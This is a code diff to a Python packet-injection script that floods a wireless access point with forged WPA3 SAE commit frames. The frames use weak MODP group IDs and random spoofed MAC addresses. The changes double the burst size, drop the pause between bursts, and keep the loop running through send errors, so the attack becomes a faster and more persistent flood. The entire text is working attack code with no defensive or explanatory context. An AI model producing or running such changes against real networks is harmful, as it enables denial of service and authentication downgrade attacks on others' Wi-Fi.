@@ -65,7 +65,7 @@ WEAK_GROUPS = {
     22: (32, 256),  # MODP 2048
     23: (32, 384),  # MODP 3072
 }
-BURST_SIZE = 64     # You can increase this to 128 for stronger bursts
+BURST_SIZE = 128
 INTER_FRAME_DELAY = 0.0001
 
 def build_downgrade_commit(bssid, mac_src, group_id, scalar_len, element_len):
@@ -108,23 +108,29 @@ def main():
     burst_count = 0
     try:
         while True:
-            packets = []
-            for g in WEAK_GROUPS:
-                s_len, e_len = WEAK_GROUPS[g]
-                for _ in range(BURST_SIZE // len(WEAK_GROUPS)):
-                    mac = str(RandMAC())
-                    pkt = build_downgrade_commit(bssid, mac, g, s_len, e_len)
-                    packets.append(pkt)
-            
-            # Transmit burst
-            sendp(packets, iface=interface, verbose=False, inter=INTER_FRAME_DELAY)
-            burst_count += 1
-            
-            # Display localized progress message
-            m = msg(language, 1, count=burst_count, frames=len(packets), groups=list(WEAK_GROUPS.keys()))
-            print(f"\r{m}", end='', flush=True)
-            time.sleep(0.5)
-            
+            try:
+                packets = []
+                for g in WEAK_GROUPS:
+                    s_len, e_len = WEAK_GROUPS[g]
+                    for _ in range(BURST_SIZE // len(WEAK_GROUPS)):
+                        mac = str(RandMAC())
+                        pkt = build_downgrade_commit(bssid, mac, g, s_len, e_len)
+                        packets.append(pkt)
+                
+                # Transmit burst
+                sendp(packets, iface=interface, verbose=False, inter=INTER_FRAME_DELAY)
+                burst_count += 1
+                
+                # Display localized progress message
+                m = msg(language, 1, count=burst_count, frames=len(packets), groups=list(WEAK_GROUPS.keys()))
+                print(f"\r{m}", end='', flush=True)
+            except OSError:
+                time.sleep(0.001)  # Minimal backoff on buffer exhaustion
+                continue
+            except KeyboardInterrupt:
+                break
+            except Exception:
+                time.sleep(1)  # Safe fallback for unexpected errors
     except KeyboardInterrupt:
         pass
     finally:
